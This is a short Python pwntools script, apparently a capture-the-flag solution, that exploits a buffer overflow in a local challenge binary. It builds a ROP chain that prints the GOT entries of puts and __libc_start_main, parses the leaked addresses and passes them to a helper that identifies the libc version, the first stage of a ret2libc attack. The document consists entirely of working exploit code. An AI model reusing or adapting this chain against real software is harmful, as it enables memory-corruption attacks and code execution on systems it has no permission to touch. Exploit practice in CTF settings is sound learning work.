from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_get_it")
payload = ""
payload += "0000000000000000000000000000000000000000"
payload += p64(0x400663)
payload += p64(0x601018)
payload += p64(0x400470)
payload += p64(0x400663)
payload += p64(0x601028)
payload += p64(0x400470)
target.sendline(payload)
target.recvline()
leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
